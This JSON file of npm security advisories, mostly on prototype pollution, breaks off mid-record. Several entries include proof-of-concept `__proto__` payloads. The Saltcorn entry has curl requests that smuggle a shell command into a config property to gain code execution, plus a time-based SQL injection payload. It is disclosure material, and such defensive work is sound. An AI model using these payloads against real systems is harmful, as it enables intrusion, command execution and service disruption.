[
   {
      "package": {
         "raw": "utils-extend@1.0.8",
         "name": "utils-extend",
         "version": "1.0.8"
      },
      "id": "GHSA-7qgg-vw88-cc99",
      "description": "The latest version of utils-extend (1.0.8) is vulnerable to Prototype Pollution through the entry function(s) lib.extend. An attacker can supply a payload with Object.prototype setter to introduce or modify properties within the global prototype chain, causing denial of service (DoS) a the minimum consequence.",
      "summary": "utils-extend Prototype Pollution",
      "date": "2025-02-06T06:31:26Z",
      "cve": "CVE-2024-57077",
      "year": 2024
   },
   {
      "package": {
         "raw": "module-from-string@3.3.1",
         "name": "module-from-string",
         "version": "3.3.1"
      },
      "id": "GHSA-q5j8-9m9g-x2jh",
      "description": "A prototype pollution in the lib.requireFromString function of module-from-string v3.3.1 allows attackers to cause a Denial of Service (DoS) via supplying a crafted payload.",
      "summary": "module-from-string prototype pollution",
      "date": "2025-02-06T06:31:25Z",
      "cve": "CVE-2024-57072",
      "year": 2024
   },
   {
      "package": {
         "raw": "uplot@1.6.30",
         "name": "uplot",
         "version": "1.6.30"
      },
      "id": "GHSA-34q8-jcq6-mc37",
      "description": "Versions of the package uplot before 1.6.31 are vulnerable to Prototype Pollution via the uplot.assign function due to missing check if the attribute resolves to the object prototype.",
      "summary": "uPlot Prototype Pollution vulnerability",
      "date": "2024-10-01T06:30:47Z",
      "cve": "CVE-2024-21489",
      "year": 2024
   },
   {
      "package": {
         "raw": "requirejs@2.3.6",
         "name": "requirejs",
         "version": "2.3.6"
      },
      "id": "GHSA-x3m3-4wpv-5vgc",
      "description": "jrburke requirejs v2.3.6 was discovered to contain a prototype pollution via the function `s.contexts._.configure`. This vulnerability allows attackers to execute arbitrary code or cause a Denial of Service (DoS) via injecting arbitrary properties.",
      "summary": "jrburke requirejs vulnerable to prototype pollution",
      "date": "2024-07-01T15:32:19Z",
      "cve": "CVE-2024-38999",
      "year": 2024
   },
   {
      "package": {
         "raw": "@aofl/cli-lib@3.14.0",
         "name": "cli-lib",
         "version": "3.14.0",
         "scope": "aofl"
      },
      "id": "GHSA-vg6v-jcg3-5mp7",
      "description": "aofl cli-lib v3.14.0 was discovered to contain a prototype pollution via the component defaultsDeep. This vulnerability allows attackers to execute arbitrary code or cause a Denial of Service (DoS) via injecting arbitrary properties.",
      "summary": "@aofl/cli-lib Prototype Pollution vulnerability",
      "date": "2024-07-01T15:32:09Z",
      "cve": "CVE-2024-38987",
      "year": 2024
   },
   {
      "package": {
         "raw": "@apphp/object-resolver@3.1.0",
         "name": "object-resolver",
         "version": "3.1.0",
         "scope": "apphp"
      },
      "id": "GHSA-qj86-v6m7-4qv2",
      "description": "apphp js-object-resolver < 3.1.1 is vulnerable to Prototype Pollution via Module.setNestedProperty.",
      "summary": "Object Resolver Prototype Pollution",
      "date": "2024-06-17T18:31:33Z",
      "cve": "CVE-2024-36577",
      "year": 2024
   },
   {
      "package": {
         "raw": "@almela/obx@0.0.3",
         "name": "obx",
         "version": "0.0.3",
         "scope": "almela"
      },
      "id": "GHSA-jj58-488v-4rgf",
      "description": "almela obx before v.0.0.4 has a Prototype Pollution issue which allows arbitrary code execution via the obx/build/index.js:656), reduce (@almela/obx/build/index.js:470), Object.set (obx/build/index.js:269) component.",
      "summary": "obx Prototype Pollution",
      "date": "2024-06-17T18:31:33Z",
      "cve": "CVE-2024-36573",
      "year": 2024
   },
   {
      "package": {
         "raw": "@allanlancioni/flatten-json@1.0.1",
         "name": "flatten-json",
         "version": "1.0.1",
         "scope": "allanlancioni"
      },
      "id": "GHSA-j8px-pjmp-325f",
      "description": "A Prototype Pollution issue in flatten-json 1.0.1 allows an attacker to execute arbitrary code via module.exports.unflattenJSON (flatten-json/index.js:42)",
      "summary": "flatten-json Prototype Pollution",
      "date": "2024-06-17T18:31:33Z",
      "cve": "CVE-2024-36574",
      "year": 2024
   },
   {
      "package": {
         "raw": "@cdr0/sg@1.0.10",
         "name": "sg",
         "version": "1.0.10",
         "scope": "cdr0"
      },
      "id": "GHSA-fg52-5jjj-28h7",
      "description": "A Prototype Pollution issue in cdr0 sg 1.0.10 allows an attacker to execute arbitrary code.",
      "summary": "@cdr0/sg Prototype Pollution",
      "date": "2024-06-17T15:30:51Z",
      "cve": "CVE-2024-36580",
      "year": 2024
   },
   {
      "package": {
         "raw": "@conform-to/dom@1.1.0",
         "name": "dom",
         "version": "1.1.0",
         "scope": "conform-to"
      },
      "id": "GHSA-624g-8qjg-8qxf",
      "description": "### Summary\nConform allows the parsing of nested objects in the form of `object.property`. Due to an improper implementation of this feature, an attacker can exploit it to trigger prototype pollution by passing a crafted input to `parseWith...` functions.\n\n### PoC\n```javascript\nconst { parseWithZod } = require('@conform-to/zod');\nconst { z } = require(\"zod\"); \n\nconst param = new URLSearchParams(\"__proto__.pollution=polluted\");\nconst schema = z.object({ \"a\": z.string() });\n\nparseWithZod(param, { schema });\nconsole.log(\"pollution:\", ({}).pollution); // should print \"polluted\"\n```\n\n### Details\n\nThe invocation of the `parseWithZod` function in the above PoC triggers the `setValue` function through `getSubmissionContext` and `parse`, executing the following process, resulting in prototype pollution:\n\n```javascript\nlet pointer = value;\n\npointer.__proto__ = pointer.__proto__;\npointer = pointer.__proto__;\n\npointer.polluted = \"polluted\";\n```\n\nThis is caused by the lack of object existence checking on [line 117 in formdata.ts](https://github.com/edmundhung/conform/blob/59156d7115a7207fa3b6f8a70a4342a9b24c2501/packages/conform-dom/formdata.ts#L117), where the code only checks for the presence of `pointer[key]` without proper validation.\n\n### Impact\nApplications that use conform for server-side validation of form data or URL parameters are affected by this vulnerability.\n",
      "summary": "Conform contains a Prototype Pollution Vulnerability in `parseWith...` function",
      "date": "2024-04-23T21:15:55Z",
      "cve": "CVE-2024-32866",
      "year": 2024
   },
   {
      "package": {
         "raw": "@zag-js/core@0.82.1",
         "name": "core",
         "version": "0.82.1",
         "scope": "zag-js"
      },
      "id": "GHSA-fg4m-w35q-vfg2",
      "description": "A prototype pollution in the lib.deepMerge function of @zag-js/core v0.50.0 allows attackers to cause a Denial of Service (DoS) via supplying a crafted payload.",
      "summary": "@zag-js/core prototype pollution",
      "date": "2025-02-06T06:31:26Z",
      "cve": "CVE-2024-57079",
      "year": 2024
   },
   {
      "package": {
         "raw": "@ndhoule/defaults@2.0.1",
         "name": "defaults",
         "version": "2.0.1",
         "scope": "ndhoule"
      },
      "id": "GHSA-79h2-v6hh-wq23",
      "description": "A prototype pollution in the lib.deep function of @ndhoule/defaults v2.0.1 allows attackers to cause a Denial of Service (DoS) via supplying a crafted payload.",
      "summary": "@ndhoule/defaults prototype pollution",
      "date": "2025-02-06T06:31:25Z",
      "cve": "CVE-2024-57066",
      "year": 2024
   },
   {
      "package": {
         "raw": "eazy-logger@4.0.1",
         "name": "eazy-logger",
         "version": "4.0.1"
      },
      "id": "GHSA-r7jx-5m6m-cpg9",
      "description": "A prototype pollution in the lib.Logger function of eazy-logger v4.0.1 allows attackers to cause a Denial of Service (DoS) via supplying a crafted payload.\n\nAn attacker can supply a payload with `Object.prototype` setter to introduce or modify properties within the global prototype chain, causing denial of service (DoS) a the minimum consequence.\n\nMoreover, the consequences of this vulnerability can escalate to other injection-based attacks, depending on how the library integrates within the application. For instance, if the polluted property propagates to sensitive Node.js APIs (e.g., `child_process.exec`, `eval`), it could enable an attacker to execute arbitrary commands within the application's context.\n\n## Proof of Concept\n\n```js\n(async () => {\nconst lib = await import('eazy-logger');\nvar someObj = {}\nconsole.log(\"Before Attack: \", JSON.stringify({}.__proto__));\ntry {\n// for multiple functions, uncomment only one for each execution.\nlib.Logger (JSON.parse('{\"__proto__\":{\"pollutedKey\":123}}'))\n} catch (e) { }\nconsole.log(\"After Attack: \", JSON.stringify({}.__proto__));\ndelete Object.prototype.pollutedKey;\n})();\n```",
      "summary": "eazy-logger prototype pollution",
      "date": "2025-02-06T06:31:26Z",
      "cve": "CVE-2024-57075",
      "year": 2024
   },
   {
      "package": {
         "raw": "@amoy/common@1.0.10",
         "name": "common",
         "version": "1.0.10",
         "scope": "amoy"
      },
      "id": "GHSA-w58v-r3cp-qr93",
      "description": "amoyjs amoy common v1.0.10 was discovered to contain a prototype pollution via the function extend. This vulnerability allows attackers to execute arbitrary code or cause a Denial of Service (DoS) via injecting arbitrary properties.",
      "summary": "@amoy/common v was discovered to contain a prototype pollution via the function extend",
      "date": "2024-07-01T15:32:15Z",
      "cve": "CVE-2024-38994",
      "year": 2024
   },
   {
      "package": {
         "raw": "jsii@5.7.2",
         "name": "jsii",
         "version": "5.7.2"
      },
      "id": "GHSA-m56h-5xx3-2jc2",
      "description": "## Summary\n\n`jsii` is a TypeScript to JavaScript compiler that also extracts an interface definition manifest to generate RPC stubs in various programming languages. jsii is typically used as a command-line tool, but it can also be loaded as a library.\nWhen loaded as a library into a larger application, prototype pollution may happen if untrusted user input is passed to the library. When used as a command line-tool, this pollution cannot occur.\n\n## Impact\n\nYou may be impacted if you have written an application that loads jsii as a library, and passes untrusted user input into the `jsii.configureCategories()` function. In that case, a user can craft input in such a way that, following the invocation, a field named \"category\" with a user-controlled value is added to the JavaScript Object prototype. This will cause every object in the program (both new and existing) to have a field named \"category\", even if it shouldn't. \n\n**This will not affect jsii itself, but it might affect the application you have loaded jsii into.**\n\n> The function `jsii.configureCategories()` is used to configure the severity (error, warning, etc.) of various jsii diagnostics.\n\n**Impacted versions: <=5.7.2, <=5.6.3, <=5.5.14, <=5.4.45** \n\n**Example:**\n\n```js\nconst jsii = require('jsii');\n\n// prints 'undefined'\nconsole.log(JSON.stringify({}.category))\n\n// calling 'configureCategories' with user input\njsii.configureCategories(JSON.parse('{\"__proto__\": \"user-input\"}'))\n\n// from this point onwards, every single object literal in the program\n// will contain the 'category' key, with user controlled value\nconsole.log(JSON.stringify({}.category)) // prints 'user-input'\n\n\n// this can affect the execution of the main program in case it also makes \n// use of an object key called 'category'. for example, if the main programs \n// happens to have code like this:\n\nconst x = {} // some object in the main program (not necessarily empty)\n\nif (x.category) {\n  // this block will always be executed, effectively \n  // changing the behavior of the main program.\n  console.log('Do something')\n} else {\n  console.log('Do something else')\n}\n```\n\nFor more information about javascript prototype pollution, see [1].\n\n## Patches\n\nA patch is included in versions [5.7.3](https://github.com/aws/jsii-compiler/releases/tag/v5.7.3), [5.6.4](https://github.com/aws/jsii-compiler/releases/tag/v5.6.4), [5.5.15](https://github.com/aws/jsii-compiler/releases/tag/v5.5.15), [5.4.46](https://github.com/aws/jsii-compiler/releases/tag/v5.4.46)\n\n## Workarounds\n\nSanitize user input to configureCategories() by stripping the __proto__ property if detected.\n\n## References\n\nIf you have any questions or comments about this advisory, we ask that you contact AWS/Amazon Security via our issue reporting page [2] or directly via email to [aws-security@amazon.com](mailto:aws-security@amazon.com). Please do not create a public GitHub issue.\n\n[1] https://learn.snyk.io/lesson/prototype-pollution/\n\n[2] [https://aws.amazon.com/security/issue-reporting](https://aws.amazon.com/security/vulnerability-reporting)\n\n## Credits\n\nWe would like to thank _Tariq Hawis_ for collaborating on this issue through the coordinated vulnerability disclosure process.",
      "summary": "Prototype pollution in jsii.configureCategories",
      "date": "2024-12-18T15:50:09Z",
      "cve": null,
      "year": 2024
   },
   {
      "package": {
         "raw": "dset@3.1.3",
         "name": "dset",
         "version": "3.1.3"
      },
      "id": "GHSA-f6v4-cf5j-vf3w",
      "description": "Versions of the package dset before 3.1.4 are vulnerable to Prototype Pollution via the dset function due improper user input sanitization. This vulnerability allows the attacker to inject malicious object property using the built-in Object property __proto__, which is recursively assigned to all the objects in the program.",
      "summary": "dset Prototype Pollution vulnerability",
      "date": "2024-09-11T06:30:39Z",
      "cve": "CVE-2024-21529",
      "year": 2024
   },
   {
      "package": {
         "raw": "@rpldy/uploader@1.9.0",
         "name": "uploader",
         "version": "1.9.0",
         "scope": "rpldy"
      },
      "id": "GHSA-pc47-g7gv-4gpw",
      "description": "A prototype pollution in the lib.createUploader function of @rpldy/uploader v1.8.1 allows attackers to cause a Denial of Service (DoS) via supplying a crafted payload.",
      "summary": "@rpldy/uploader prototype pollution",
      "date": "2025-02-06T06:31:26Z",
      "cve": "CVE-2024-57082",
      "year": 2024
   },
   {
      "package": {
         "raw": "vxe-table@3.16.3",
         "name": "vxe-table",
         "version": "3.16.3"
      },
      "id": "GHSA-89fp-f5mx-748x",
      "description": "A prototype pollution in the lib.install function of vxe-table v4.8.10 allows attackers to cause a Denial of Service (DoS) via supplying a crafted payload.",
      "summary": "vxe-table prototype pollution",
      "date": "2025-02-06T06:31:26Z",
      "cve": "CVE-2024-57080",
      "year": 2024
   },
   {
      "package": {
         "raw": "bun@1.1.29",
         "name": "bun",
         "version": "1.1.29"
      },
      "id": "GHSA-v9mx-4pqq-h232",
      "description": "Versions of the package bun before 1.1.30 are vulnerable to Prototype Pollution due to improper input sanitization. An attacker can exploit this vulnerability through Bun's APIs that accept objects.",
      "summary": "Bun has an Application-level Prototype Pollution vulnerability in the runtime native API for Glo",
      "date": "2024-12-18T06:30:49Z",
      "cve": "CVE-2024-21548",
      "year": 2024
   },
   {
      "package": {
         "raw": "@intlify/shared@9.14.1",
         "name": "shared",
         "version": "9.14.1",
         "scope": "intlify"
      },
      "id": "GHSA-hjwq-mjwj-4x6c",
      "description": "**Vulnerability type: Prototype Pollution**\n\n**Affected Package:**\n\nProduct: @intlify/shared\nVersion: 10.0.4\n\n\n**Vulnerability Location(s):**\n\n`node_modules/@intlify/shared/dist/shared.cjs:232:26`\n\n\n**Description:**\n\nThe latest version of `@intlify/shared (10.0.4)` is vulnerable to Prototype Pollution through the entry function(s) `lib.deepCopy`. An attacker can supply a payload with `Object.prototype` setter to introduce or modify properties within the global prototype chain, causing denial of service (DoS) the minimum consequence.\n\nMoreover, the consequences of this vulnerability can escalate to other injection-based attacks, depending on how the library integrates within the application. For instance, if the polluted property propagates to sensitive Node.js APIs (e.g., exec, eval), it could enable an attacker to execute arbitrary commands within the application's context.\n\n**PoC:**\n\n```bash\n// install the package with the latest version\n~$ npm install @intlify/shared@10.0.4\n// run the script mentioned below \n~$ node poc.js\n//The expected output (if the code still vulnerable) is below. \n// Note that the output may slightly differs from function to another.\nBefore Attack:  {}\nAfter Attack:  {\"pollutedKey\":123}\n```\n\n\n```js\n(async () => {\nconst lib = await import('@intlify/shared');\nvar someObj = {}\nconsole.log(\"Before Attack: \", JSON.stringify({}.__proto__));\ntry {\n// for multiple functions, uncomment only one for each execution.\nlib.deepCopy (JSON.parse('{\"__proto__\":{\"pollutedKey\":123}}'), someObj)\n} catch (e) { }\nconsole.log(\"After Attack: \", JSON.stringify({}.__proto__));\ndelete Object.prototype.pollutedKey;\n})();\n```\n\n**References**\n\n[Prototype Pollution Leading to Remote Code Execution](https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/) - An example of how prototype pollution can lead to command code injection.\n\n[OWASP Prototype Pollution Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Prototype_Pollution_Prevention_Cheat_Sheet.html) - Best practices for preventing prototype pollution.\n\n[PortSwigger Guide on Preventing Prototype Pollution](https://portswigger.net/web-security/prototype-pollution/preventing) - A detailed guide to securing your applications against prototype pollution.",
      "summary": "@intlify/shared Prototype Pollution vulnerability",
      "date": "2024-12-02T17:26:47Z",
      "cve": "CVE-2024-52810",
      "year": 2024
   },
   {
      "package": {
         "raw": "mermaid@10.9.2",
         "name": "mermaid",
         "version": "10.9.2"
      },
      "id": "GHSA-m4gq-x24j-jpmf",
      "description": "The following bundled files within the Mermaid NPM package contain a bundled version of DOMPurify that is vulnerable to https://github.com/cure53/DOMPurify/security/advisories/GHSA-mmhx-hmjr-r674, potentially resulting in an XSS attack.\n\nThis affects the built:\n\n- `dist/mermaid.min.js`\n- `dist/mermaid.js`\n- `dist/mermaid.esm.mjs`\n- `dist/mermaid.esm.min.mjs`\n\nThis will also affect users that use the above files via a CDN link, e.g. `https://cdn.jsdelivr.net/npm/mermaid@10.9.2/dist/mermaid.min.js`\n\n**Users that use the default NPM export of `mermaid`, e.g. `import mermaid from 'mermaid'`, or the `dist/mermaid.core.mjs` file, do not use this bundled version of DOMPurify, and can easily update using their package manager with something like `npm audit fix`.**\n\n### Patches\n\n- `develop` branch: 6c785c93166c151d27d328ddf68a13d9d65adc00\n- backport to v10: 92a07ffe40aab2769dd1c3431b4eb5beac282b34",
      "summary": "Prototype pollution vulnerability found in Mermaid's bundled version of DOMPurify",
      "date": "2024-10-22T18:17:02Z",
      "cve": null,
      "year": 2024
   },
   {
      "package": {
         "raw": "@sap/hana-client@2.21.28",
         "name": "hana-client",
         "version": "2.21.28",
         "scope": "sap"
      },
      "id": "GHSA-6339-gv7w-g5f4",
      "description": "The SAP HANA Node.js client package versions from 2.0.0 before 2.21.31 is impacted by Prototype Pollution vulnerability allowing an attacker to add arbitrary properties to global object prototypes. This is due to improper user input sanitation when using the nestTables feature causing low impact on the availability of the application. This has no impact on Confidentiality and Integrity.",
      "summary": "SAP HANA Node.js client package vulnerable to Prototype Pollution",
      "date": "2024-10-08T06:30:47Z",
      "cve": "CVE-2024-45277",
      "year": 2024
   },
   {
      "package": {
         "raw": "@saltcorn/server@1.0.0-beta.13",
         "name": "server",
         "version": "1.0.0-beta.13",
         "scope": "saltcorn"
      },
      "id": "GHSA-78p3-fwcq-62c2",
      "description": "### Summary\n\nThe endpoint `/site-structure/localizer/save-string/:lang/:defstring` accepts two parameter values: `lang` and `defstring`. These values are used in an unsafe way to set the keys and value of the `cfgStrings` object. It allows to add/modify properties of the `Object prototype` that result in several logic issues, including:\n- RCE vulnerabilities by polluting the `tempRootFolder` property \n- SQL injection vulnerabilities by polluting the `schema` property when using `PostgreSQL` database.\n\n\n### Details\n\n- file: https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/server/routes/infoarch.js#L236-L239\n```js\nrouter.post(\n  \"/localizer/save-string/:lang/:defstring\",\n  isAdmin,\n  error_catcher(async (req, res) => {\n    const { lang, defstring } = req.params; // source\n\n    const cfgStrings = getState().getConfigCopy(\"localizer_strings\");\n    if (cfgStrings[lang]) cfgStrings[lang][defstring] = text(req.body.value); // [1] sink\n    else cfgStrings[lang] = { [defstring]: text(req.body.value) };\n    await getState().setConfig(\"localizer_strings\", cfgStrings);\n    res.redirect(`/site-structure/localizer/edit/${lang}`);\n  })\n);\n```\n\n### PoC\n\nSetup:\n- set `SALTCORN_NWORKERS=1` before starting the `saltcorn` server (to easily observe the behavior of the PoC)\n```\nSALTCORN_NWORKERS=1 saltcorn serve\n```\n- make sure to use PostgresSQL backend\n- login with a user with admin permission\n\n#### RCE\n\nThis PoC demonstrates how to escalate the Prototype Pollution vulnerability to change the behavior of certain command executed.\n- check that the file that will be created does not exists:\n```\ncat /tmp/RCE\ncat: /tmp/RCE: No such file or directory\n```\n\n- pollute the `Object.prototype` with a `tempRootFolder` value set to `;echo+\"rce\"|tee+/tmp/RCE;` by sending the following request *** :\n\n```bash\ncurl -i -X $'POST' \\\n    -H $'Host: localhost:3000' \\\n    -H $'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -H $'Accept: */*' \\\n    -H $'Origin: http://localhost:3000' \\\n    -H $'Connection: close' \\\n    -b $'loggedin=true; connect.sid=VALID_CONNECT_SID_COOKIE' \\\n    --data-binary $'_csrf=VALID_csrf_Value&value=;echo+\"rce\"|tee+/tmp/RCE;' \\\n    $'http://localhost:3000/site-structure/localizer/save-string/__proto__/tempRootFolder'\n```\n\n visit `http://localhost:3000/plugins/new`\n- enter the following fields:\n\t- Name: `test`\n\t- Source: `git`\n\t- other fields blank\n  - click `Create`\n- you will get an error but the command `echo \"rce\" | tee /tmp/RCE` will be executed\n- to verify:\n```\ncat /tmp/RCE\nrce\n```\n\nThe RCE occurs because after the previous curl request, the `tempRootFolder` property is set to `;echo+\"rce\"|tee+/tmp/RCE;` that is later used to build the shell commands.\n\n- file: https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/plugins-loader/plugin_installer.js#L45-L58\n\n```js\nclass PluginInstaller {\n  constructor(plugin, opts = {}) { // opts will have the tempRootFolder property set with dangerous values // [2]\n    [...]\n    this.tempRootFolder =\n      opts.tempRootFolder || envPaths(\"saltcorn\", { suffix: \"tmp\" }).temp; // [3]\n\t [...]\n    this.pckJsonPath = join(this.pluginDir, \"package.json\");\n    this.tempDir = join(this.tempRootFolder, \"temp_install\", ...tokens); // [4]\n    [...]\n  }\n  [...]\n}\n```\n\n#### SQL Injection\n\nThis PoC demonstrates how to escalate the Prototype Pollution vulnerability to change the behavior of certain SQL queries (i.e SQLi).\n- visit `http://localhost:3000/table` to check the page returns some results (no errors)\n- pollute the `Object.prototype` with a schema value set to `\"` (just to create an exception in the query that will be executed to demonstrate the issue) by sending the following request *** :\n\n```\ncurl -i -X $'POST' \\\n    -H $'Host: localhost:3000' \\\n    -H $'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -H $'Accept: */*' \\\n    -H $'Origin: http://localhost:3000' \\\n    -H $'Connection: close' \\\n    -b $'loggedin=true; connect.sid=VALID_CONNECT_SID_COOKIE' \\\n    --data-binary $'_csrf=VALID_csrf_Value&value=\\\"' \\\n    $'http://localhost:3000/site-structure/localizer/save-string/__proto__/schema'\n```\n\n- visit again `http://localhost:3000/table` but this time an SQL error will appear:\n```\nsyntax error at or near \"\" order by lower(\"\"\n```\n\n\n**NOTE**: Another payload to use as `value` could be `pg_user\"+WHERE+1=1+AND+(SELECT+pg_sleep(5))+IS+NOT+NULL+--`\n\nThe SQL injection occurs because after the previous curl request, the `schema` property is set to `\"`.\n- file: https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/postgres/postgres.js#L101\n\n```js\nconst select = async (tbl, whereObj, selectopts = {}) => { // [2] selectopts\n  const { where, values } = mkWhere(whereObj);\n  const schema = selectopts.schema || getTenantSchema(); // [3] selectopts.schema\n  const sql = `SELECT ${\n    selectopts.fields ? selectopts.fields.join(\", \") : `*`\n  } FROM \"${schema}\".\"${sqlsanitize(tbl)}\" ${where} ${mkSelectOptions( // [4] schema\n    selectopts,\n    values,\n    false\n  )}`;\n  sql_log(sql, values);\n  const tq = await (client || selectopts.client || pool).query(sql, values);\n\n  return tq.rows;\n};\n```\n\n*** Retrieve valid values for the `connect.sid` (`VALID_CONNECT_SID_COOKIE`) and `_csrf` values (`VALID_csrf_Value`) :\n- open the browser developer console and go to the `Network` tab\n- visit `http://localhost:3000/site-structure/localizer/add-lang`\n- add a language (`Name: test` , `Locale: test`) and click `Save`\n- under the `Network` tab, filter for `save-lang` and check the request parameters (`Headers` and `Payload`/`Request` tabs)\n- copy the values for `connect.sid` and `_csrf` and paste in the curl command above\n\n### Impact\n\nRemote code execution (RCE), Sql injection and business logic errors.\n\n### Recommended Mitigation\n\nCheck the values of `lang` and  `defstring` parameters against dangerous properties like `__proto__`, `constructor`, `prototype`.",
      "summary": "@saltcorn/server Remote Code Execution (RCE) / SQL injection via prototype pollution  by manipulating `lang` and  `defstring` parameters when setting localizer strings",
      "date": "2024-10-03T19:50:59Z",
      "cve": null,
      "year": 2024
   },
   {
      "package": {
         "raw": "@backstage/plugin-catalog-backend@1.25.2",
         "name": "plugin-catalog-backend",
         "version": "1.25.2",
         "scope": "backstage"
      },
      "id": "GHSA-3x3f-jcp3-g22j",
      "description": "### Impact\n\nA malicious actor with authenticated access to a Backstage instance with the catalog backend plugin installed is able to interrupt the service using a specially crafted query to the catalog API.\n\n### Patches\n\nThis has been fixed in the `1.26.0` release of the `@backstage/plugin-catalog-backend` package.\n\n### References\n\nIf you have any questions or comments about this advisory:\n\nOpen an issue in the [Backstage repository](https://github.com/backstage/backstage)\nVisit our Discord, linked to in [Backstage README](https://github.com/backstage/backstage)\n",
      "summary": "@backstage/plugin-catalog-backend Prototype Pollution vulnerability",
      "date": "2024-09-17T21:29:49Z",
      "cve": "CVE-2024-45815",
      "year": 2024
   },
   {
      "package": {
         "raw": "@bunt/app@0.29.22",
         "name": "app",
         "version": "0.29.22",
         "scope": "bunt"
      },
      "id": "GHSA-p734-xg27-8cfq",
      "description": "izatop bunt v0.29.19 was discovered to contain a prototype pollution via the component /esm/qs.js. This vulnerability allows attackers to execute arbitrary code via injecting arbitrary properties.",
      "summary": "Prototype pollution in izatop bunt",
      "date": "2024-08-12T15:30:49Z",
      "cve": "CVE-2024-38989",
      "year": 2024
   },
   {
      "package": {
         "raw": "@cat5th/key-serializer@0.2.5",
         "name": "key-serializer",
         "version": "0.2.5",
         "scope": "cat5th"
      },
      "id": "GHSA-whpx-g542-7c7v",
      "description": "harvey-woo cat5th/key-serializer v0.2.5 was discovered to contain a prototype pollution via the function \"query\". This vulnerability allows attackers to execute arbitrary code or cause a Denial of Service (DoS) via injecting arbitrary properties.",
      "summary": "@cat5th/key-serializer Prototype Pollution vulnerability",
      "date": "2024-07-01T15:32:30Z",
      "cve": "CVE-2024-39018",
      "year": 2024
   },
   {
      "package": {
         "raw": "@ag-grid-enterprise/charts@32.0.0",
         "name": "charts",
         "version": "32.0.0",
         "scope": "ag-grid-enterprise"
      },
      "id": "GHSA-328p-362g-r48j",
      "description": "ag-grid-enterprise v31.3.2 was discovered to contain a prototype pollution via the component _ModuleSupport.jsonApply. This vulnerability allows attackers to execute arbitrary code or cause a Denial of Service (DoS) via injecting arbitrary properties.",
      "summary": "ag-grid packages vulnerable to Prototype Pollution",
      "date": "2024-07-01T15:32:20Z",
      "cve": "CVE-2024-39001",
      "year": 2024
   },
   {
      "package": {
         "raw": "@adolph_dudu/ratio-swiper@0.0.2",
         "name": "ratio-swiper",
         "version": "0.0.2",
         "scope": "adolph_dudu"
      },
      "id": "GHSA-88vr-hjqx-57qh",
      "description": "adolph_dudu ratio-swiper v0.0.2 was discovered to contain a prototype pollution via the function extendDefaults. This vulnerability allows attackers to execute arbitrary code or cause a Denial of Service (DoS) via injecting arbitrary properties.",
      "summary": "adolph_dudu ratio-swiper was discovered to contain a prototype pollution via the function extendDefaults",
      "date": "2024-07-01T15:32:17Z",
      "cve": "CVE-2024-38997",
      "year": 2024
   },
   {
      "package": {
         "raw": "@akbr/patch-into@1.0.1",
         "name": "patch-into",
         "version": "1.0.1",
         "scope": "akbr"
      },
      "id": "GHSA-gh4x-qv3p-m9pm",
      "description": "akbr patch-into version 1.0.1 was discovered to contain a prototype pollution via the function patchInto. This vulnerability allows attackers to execute arbitrary code or cause a Denial of Service (DoS) via injecting arbitrary properties.",
      "summary": "akbr patch-into was discovered to contain a prototype pollution via the function patchInto",
      "date": "2024-07-01T15:32:11Z",
      "cve": "CVE-2024-38991",
      "year": 2024
   },
   {
      "package": {
         "raw": "@akbr/update@1.0.0",
         "name": "update",
         "version": "1.0.0",
         "scope": "akbr"
      },
      "id": "GHSA-mj4p-gmhr-92g3",
      "description": "akbr update 1.0.0 is vulnerable to Prototype Pollution via update/index.js.",
      "summary": "@akbr/update Prototype Pollution",
      "date": "2024-06-17T18:31:34Z",
      "cve": "CVE-2024-36578",
      "year": 2024
   },
   {
      "package": {
         "raw": "mysql2@3.9.7",
         "name": "mysql2",
         "version": "3.9.7"
      },
      "id": "GHSA-pmh2-wpjm-fj45",
      "description": "Versions of the package mysql2 before 3.9.8 are vulnerable to Prototype Pollution due to improper user input sanitization passed to fields and tables when using nestTables.",
      "summary": "mysql2 vulnerable to Prototype Pollution",
      "date": "2024-05-30T18:34:32Z",
      "cve": "CVE-2024-21512",
      "year": 2024
   },
   {
      "package": {
         "raw": "@blackprint/engine@0.9.1",
         "name": "engine",
         "version": "0.9.1",
         "scope": "blackprint"
      },
      "id": "GHSA-g3q2-vcjq-rgrc",
      "description": "A Prototype Pollution issue in Blackprint @blackprint/engine 0.8.12 through 0.9.1 allows an attacker to execute arbitrary code via the `_utils.setDeepProperty` function of `engine.min.js`.",
      "summary": "Blackprint @blackprint/engine Prototype Pollution issue",
      "date": "2024-05-20T18:31:22Z",
      "cve": "CVE-2024-24294",
      "year": 2024
   },
   {
      "package": {
         "raw": "chartist@1.3.0",
         "name": "chartist",
         "version": "1.3.0"
      },
      "id": "SNYK-JS-CHARTIST-7850459",
      "description": "chartist is a Simple, responsive charts\nAffected versions of this package are vulnerable to Prototype Pollution via the extend function. An attacker can alter the behavior of all objects inheriting from the affected prototype by passing arguments to the vulnerable function crafted with the built-in property __proto__.\n",
      "summary": "Prototype Pollution  Affecting chartist package, versions <1.3.1",
      "date": "29 Aug 2024",
      "cve": "CVE-2024-45435",
      "year": 2024
   },
   {
      "package": {
         "raw": "node-gettext@3.0.0",
         "name": "node-gettext",
         "version": "3.0.0"
      },
      "id": "GHSA-g974-hxvm-x689",
      "description": "All versions of the package node-gettext are vulnerable to Prototype Pollution via the addTranslations() function in gettext.js due to improper user input sanitization.",
      "summary": "node-gettext vulnerable to Prototype Pollution",
      "date": "2024-09-10T06:30:48Z",
      "cve": "CVE-2024-21528",
      "year": 2024
   },
   {
      "package": {
         "raw": "@75lb/deep-merge@1.1.1",
         "name": "deep-merge",
         "version": "1.1.1",
         "scope": "75lb"
      },
      "id": "GHSA-28mc-g557-92m7",
      "description": "Prototype Pollution in 75lb deep-merge 1.1.1 allows attackers to execute arbitrary code or cause a Denial of Service (DoS) and cause other impacts via merge methods of lodash to merge objects.",
      "summary": "@75lb/deep-merge Prototype Pollution vulnerability",
      "date": "2024-07-30T21:31:28Z",
      "cve": "CVE-2024-38986",
      "year": 2024
   },
   {
      "package": {
         "raw": "fast-loops@1.1.3",
         "name": "fast-loops",
         "version": "1.1.3"
      },
      "id": "GHSA-3q56-9cc2-46j4",
      "description": "robinweser fast-loops v1.1.3 was discovered to contain a prototype pollution via the function `objectMergeDeep`. This vulnerability allows attackers to execute arbitrary code or cause a Denial of Service (DoS) via injecting arbitrary properties.",
